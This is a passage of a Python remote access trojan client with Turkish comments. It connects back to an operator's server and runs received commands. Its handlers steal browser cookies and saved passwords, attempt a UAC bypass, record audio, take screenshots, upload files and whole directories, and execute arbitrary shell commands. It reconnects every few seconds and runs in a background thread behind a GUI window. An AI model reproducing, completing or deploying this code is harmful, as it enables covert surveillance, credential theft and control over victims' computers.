                            os.remove(kayit_dosyasi)  # Geçici dosyayı sil
                            baglanti.send(response.encode("utf-8"))
                            logging.info(f"Ses kaydı (30m) gönderildi: {output_file}")
                        else:
                            response = "Ses kaydı hatası!"
                            baglanti.send(response.encode("utf-8"))
                            logging.error("Ses kaydı (30m) başarısız.")

                    elif ana_komut == "cd":
                        try:
                            os.chdir(arguman)
                            response = f"Dizin başarıyla değiştirildi: {os.getcwd()}"
                            logging.info(f"Dizin değiştirildi: {os.getcwd()}")
                        except Exception as e:
                            response = f"Dizin değiştirilirken hata oluştu: {e}"
                            logging.error(f"Dizin değiştirme hatası: {e}")

                    elif ana_komut == "pwd":
                        response = os.getcwd()
                        logging.debug(f"PWD: {response}")

                    elif ana_komut == "download":
                        if os.path.isdir(arguman):
                            zip_path = arguman + ".zip"
                            zip_directory(arguman, zip_path)
                            response = send_file(baglanti, zip_path)
                            os.remove(zip_path)
                        else:
                            response = send_file(baglanti, arguman)

                    elif ana_komut == "block_website":
                        block_website(arguman, baglanti)
                        continue

                    elif ana_komut == "unblock_website":
                        unblock_website(arguman, baglanti)
                        continue

                    elif ana_komut == "get_cookies":
                        browsers = Browsers(baglanti)
                        browsers.grab_cookies()
                        continue

                    elif ana_komut == "uac_bypass":
                        uac_bypass(baglanti)
                        continue

                    elif ana_komut == "grab_passwords":
                        grab_passwords(baglanti)
                        continue

                    elif ana_komut == "get_authority":
                        authority = "Admin" if IsAdmin() else "Normal Kullanıcı"
                        response = f"Yetki: {authority}"
                        logging.debug(f"Yetki sorgusu: {authority}")

                    elif ana_komut == "ss" or ana_komut == "screenshot":
                        if not pyautogui:
                            response = "Hata: PyAutoGUI kütüphanesi yüklenmediği için ekran görüntüsü alınamadı."
                            logging.error("Screenshot: PyAutoGUI yüklü değil")
                        else:
                            ssname = arguman if arguman else f"ss_{int(time.time())}.png"
                            ss_yolu = os.path.join(TEMP_DIR, ssname)
                            try:
                                pyautogui.screenshot().save(ss_yolu)
                                response = send_file(baglanti, ss_yolu)
                                os.remove(ss_yolu)
                                logging.info(f"Ekran görüntüsü alındı: {ss_yolu}")
                            except Exception as e:
                                response = f"Ekran görüntüsü/gönderme hatası: {e}"
                                logging.error(f"Ekran görüntüsü hatası: {e}")

                    elif ana_komut == "kamera" and arguman == "aç":
                        response = "Kamera işlevi çağrıldı (Özel kod gerektirir)."
                        logging.info("Kamera komutu alındı (özel kod gerekli).")

                    elif ana_komut == "calistir":
                        response = execute_command(arguman)

                    elif ana_komut == "dir" or ana_komut == "ls":
                        try:
                            files = os.listdir(os.getcwd())
                            response = "ls:\n" + "\n".join(files)
                            logging.debug(f"Dir/Ls: {response}")
                        except Exception as e:
                            response = f"ls hatası: {e}"
                            logging.error(f"Dir/Ls hatası: {e}")

                    elif ana_komut == "mkdir":
                        try:
                            os.mkdir(arguman)
                            response = f"Dizin oluşturuldu: {arguman}"
                            logging.info(f"Dizin oluşturuldu: {arguman}")
                        except Exception as e:
                            response = f"mkdir hatası: {e}"
                            logging.error(f"mkdir hatası: {e}")

                    elif ana_komut == "messagebox":
                        show_message_box(arguman)
                        response = "MessageBox gösterildi."
                        logging.info(f"MessageBox komutu: {arguman}")

                    else:
                        response = execute_command(kod)

                    try:
                        baglanti.send(response.encode("utf-8"))
                        logging.debug(f"Yanıt gönderildi: {response}")
                    except Exception as e:
                        logging.error(f"Yanıt gönderme hatası: {e}")
                        break

                except socket.timeout:
                    logging.warning("Komut beklerken zaman aşımı")
                    continue
                except Exception as e:
                    logging.error(f"Komut işleme hatası: {e}")
                    break

        except ConnectionRefusedError:
            logging.error(f"Bağlantı reddedildi: {SERVER_IP}:{SERVER_PORT}")
            print(f"Bağlantı reddedildi. Sunucunun ({SERVER_IP}:{SERVER_PORT}) açık olduğundan emin olun.")
        except ConnectionResetError:
            logging.error("Uzaktan bağlantı zorla kapatıldı (Sunucu kapandı).")
            print("Uzaktan bağlantı zorla kapatıldı (Sunucu kapandı).")
        except socket.timeout:
            logging.error("Bağlantı zaman aşımına uğradı.")
            print("Bağlantı zaman aşımına uğradı.")
        except Exception as e:
            logging.error(f"Beklenmedik hata: {e}")
            print(f"Beklenmedik hata: {e}")
        finally:
            if baglanti:
                try:
                    baglanti.close()
                    logging.info("Bağlantı kapatıldı.")
                except:
                    pass
            print("5 saniye sonra yeniden bağlanmayı deneyecek...")
            logging.info("5 saniye sonra yeniden bağlanmayı deneyecek...")
            time.sleep(5)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    gui = ClientGUI()
    gui.show()

    # Arka planda client main fonksiyonunu thread olarak çalıştır
    client_thread = threading.Thread(target=main, daemon=True)
    client_thread.start()

    sys.exit(app.exec())
